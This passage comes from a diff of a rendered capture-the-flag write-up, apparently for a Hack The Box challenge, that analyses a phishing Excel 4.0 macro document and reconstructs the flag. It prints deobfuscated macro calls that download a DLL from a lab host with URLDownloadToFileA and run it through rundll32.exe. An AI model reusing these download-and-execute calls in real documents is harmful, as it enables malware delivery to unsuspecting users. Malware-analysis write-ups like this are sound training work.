+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">CALL</span><span class="p">(</span><span class="s2">&#34;URLMON&#34;</span><span class="p">,</span><span class="s2">&#34;URLDownloadToFileA&#34;</span><span class="p">,</span><span class="s2">&#34;JJCCJJ&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;http://0b.htb/s.dll&#34;</span><span class="p">,</span><span class="s2">&#34;C:</span><span class="se">\r</span><span class="s2">ncwner\CkuiQhTXx.dll&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span></span></span></code></pre></div></div>
 <ol start="5">
 <li>It executes the downloaded DLL using rundll32.exe.</li>
 </ol>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>CALL(<span style="color:#a5d6ff">&#34;Shell32&#34;</span>,<span style="color:#a5d6ff">&#34;ShellExecuteA&#34;</span>,<span style="color:#a5d6ff">&#34;JJCCCCJ&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">&#34;Open&#34;</span>,<span style="color:#a5d6ff">&#34;rundll32.exe&#34;</span>,<span style="color:#a5d6ff">&#34;C:</span><span style="color:#79c0ff">\r</span><span style="color:#a5d6ff">ncwner\CkuiQhTXx.dll...&#34;</span>,<span style="color:#a5d6ff">0</span>,<span style="color:#a5d6ff">0</span>)</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">CALL</span><span class="p">(</span><span class="s2">&#34;Shell32&#34;</span><span class="p">,</span><span class="s2">&#34;ShellExecuteA&#34;</span><span class="p">,</span><span class="s2">&#34;JJCCCCJ&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;Open&#34;</span><span class="p">,</span><span class="s2">&#34;rundll32.exe&#34;</span><span class="p">,</span><span class="s2">&#34;C:</span><span class="se">\r</span><span class="s2">ncwner\CkuiQhTXx.dll...&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span></span></span></code></pre></div></div>
 
 <h2 class="relative group">Flag Reconstruction
     <div id="flag-reconstruction" class="anchor"></div>
@@ -1062,13 +1149,13 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
 </h2>
 <p>Analyzing cell R1191 reveals the flag embedded in the rundll32 command line:</p>
 <p><strong>Part 1:</strong> Cell D8 (when GET.WORKSPACE(42) = TRUE)</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39; CELL:D8, FullEvaluation, [TRUE] &#34; HTB{n0w_e&#34;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">&#39; CELL:D8, FullEvaluation, [TRUE] &#34; HTB{n0w_e&#34;</span></span></code></pre></div></div>
 <p><strong>Part 2:</strong> Hardcoded string</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#34;Xc3l_4.0_M4&#34;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">&#34;Xc3l_4.0_M4&#34;</span></span></code></pre></div></div>
 <p><strong>Part 3:</strong> Cell D1023 (when Windows version ≠ 6.1)</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39; CELL:D1023, FullEvaluation, [FALSE] &#34;cr0s_r_b4cK}&#34;</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">&#39; CELL:D1023, FullEvaluation, [FALSE] &#34;cr0s_r_b4cK}&#34;</span></span></code></pre></div></div>
 <p><strong>Complete flag:</strong></p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>HTB{n0w_eXc3l_4.0_M4cr0s_r_b4cK}</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">HTB{n0w_eXc3l_4.0_M4cr0s_r_b4cK}</span></span></code></pre></div></div>
 
 <h2 class="relative group">Attack Flow
     <div id="attack-flow" class="anchor"></div>
